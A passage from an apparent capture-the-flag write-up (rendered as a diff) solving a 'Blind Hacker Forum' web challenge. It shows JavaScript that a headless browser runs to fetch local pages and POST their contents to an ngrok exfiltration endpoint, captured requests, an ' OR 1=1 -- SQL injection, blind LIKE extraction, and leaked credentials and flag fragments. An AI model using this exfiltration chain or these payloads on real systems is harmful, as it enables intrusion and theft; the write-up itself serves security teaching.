+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;username=whatever&amp;password=whatever&#34;</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-5">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 612
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;<span style="color:#f92672">center</span>&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signin-form&#34;</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Username: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Password: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Log In&lt;/<span style="color:#f92672">button</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+&lt;/<span style="color:#f92672">center</span>&gt;
+
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>As you have seen, nothing happens. That could be intended, but the problem here is that an specific header must be sent for the server to know we are sending data.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>);
+</code></pre></div><h4 id="html-content-6">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;username=whatever&amp;password=whatever&#34;</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-6">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 767
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;<span style="color:#f92672">center</span>&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signin-form&#34;</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Username: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Password: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Log In&lt;/<span style="color:#f92672">button</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+&lt;/<span style="color:#f92672">center</span>&gt;
+
+    &lt;<span style="color:#f92672">p</span>&gt;Invalid username, email or password...&lt;/<span style="color:#f92672">p</span>&gt;
+    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://tenor.com/view/negros-ataud-ataud-meme-negros-dance-coffin-squad-gif-16889809&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>Ups, it says invalid username, email or password… Despite sending just username and password, it has sent us another field, so maybe it is printing what it cannot find in the database. So let’s try a minimum SQL Injection payload to see whether our input is being sanitized or not.</p>
+<h4 id="html-content-7">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;username=&#39; OR 1=1 -- &#39;&amp;password=whatever&#34;</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-7">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: fa79d7a6.ngrok.io
+Content-Length: 695
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
+
+&lt;<span style="color:#f92672">center</span>&gt;
+        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;signin-form&#34;</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Username: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-element&#34;</span>&gt;
+                &lt;<span style="color:#f92672">label</span>&gt;Password: &lt;/<span style="color:#f92672">label</span>&gt;
+                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">required</span> /&gt;
+            &lt;/<span style="color:#f92672">div</span>&gt;
+            &lt;<span style="color:#f92672">br</span>&gt;
+            &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login&#34;</span>&gt;Log In&lt;/<span style="color:#f92672">button</span>&gt;
+        &lt;/<span style="color:#f92672">form</span>&gt;
+&lt;/<span style="color:#f92672">center</span>&gt;
+
+    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://tenor.com/view/jesus-jesus-walk-yass-jesus-gif-14042558&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>Yay! The query is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, email, password <span style="color:#66d9ef">FROM</span> userinfo <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$user&#39;</span> <span style="color:#66d9ef">AND</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$pwd&#39;</span>;
+</code></pre></div><p>And submiting our payload, it is converted to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, email, password <span style="color:#66d9ef">FROM</span> userinfo <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">-- &#39;&#39; AND password = &#39;whatever&#39;;
+</span></code></pre></div><p>As you can see, only the username is being treated, and it returns true, so we will have to make some kind of time / error based injection.
+This can be automatised chaining sqlmap with flask serving dinamic content to the html file, or without sqlmap trying to guess the values like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, email, password <span style="color:#66d9ef">FROM</span> userinfo <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">OR</span> username <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;a%&#39;</span> <span style="color:#75715e">-- &#39;&#39; AND password = &#39;whatever&#39;;
+</span></code></pre></div><p>Where “a” is the character being tried to be in the first place of the username. This can be very tough if there’s no automation with flask serving dinamic content, or making a for loop in the js the browser executes.</p>
+<p>This are the values that must be extracted before getting inside the second stage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>userinfo<span style="color:#f92672">`</span>(<span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>email<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;betauser&#39;</span>,<span style="color:#e6db74">&#39;flag{sqli_is_l0v3_but_&#39;</span>,<span style="color:#e6db74">&#39;letsputapass!&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>userinfo<span style="color:#f92672">`</span>(<span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>email<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;auseryouarenotsearchingf0r&#39;</span>,<span style="color:#e6db74">&#39;i@told.u&#39;</span>,<span style="color:#e6db74">&#39;you4recrazy&#39;</span>);
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>userinfo<span style="color:#f92672">`</span>(<span style="color:#f92672">`</span>username<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>email<span style="color:#f92672">`</span>, <span style="color:#f92672">`</span>password<span style="color:#f92672">`</span>) <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;mike&#39;</span>,<span style="color:#e6db74">&#39;mikedun@geo.on&#39;</span>,<span style="color:#e6db74">&#39;giveitatryifyouhaventalready&#39;</span>);
+</code></pre></div><p>Submitting the first pair of credentials leads to this behaviour:</p>
+<h4 id="html-content-8">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/token.php&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">16</span>);
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;http://localhost/index.php?indextoken=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">token</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+                        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                                <span style="color:#a6e22e">third</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                                <span style="color:#a6e22e">third</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">responseText</span>);
+                        }
+                }
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;username=betauser&amp;password=letsputapass!&#34;</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-8">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 120
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+index.php is deprecated, please go to the new forum located in other common port. At least you got a part of the flag ;)
+</code></pre></div><h2 id="second-stage">Second stage</h2>
+<p>The other common port is 8080 and returns this:</p>
+<h4 id="html-content-9">HTML content</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+
+<span style="color:#a6e22e">first</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;http://localhost:8080&#34;</span>);
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">XMLHttpRequest</span>.<span style="color:#a6e22e">DONE</span>) {
+                <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;NGROK-TUNNEL/exfiltration&#34;</span>);
+                <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">responseText</span>);
+        }
+}
+<span style="color:#a6e22e">first</span>.<span style="color:#a6e22e">send</span>();
+
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><h4 id="response-9">Response</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">POST /exfiltration HTTP/1.1
+Host: NGROK-TUNNEL
+Content-Length: 194
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/81.0.4044.129 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: NGROK-TUNNEL/index.html
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US
+Connection: close
+
+&lt;<span style="color:#f92672">html</span>&gt;
+
+&lt;<span style="color:#f92672">h1</span>&gt; BLIND HACKER ACTUAL FORUM &lt;/<span style="color:#f92672">h1</span>&gt;
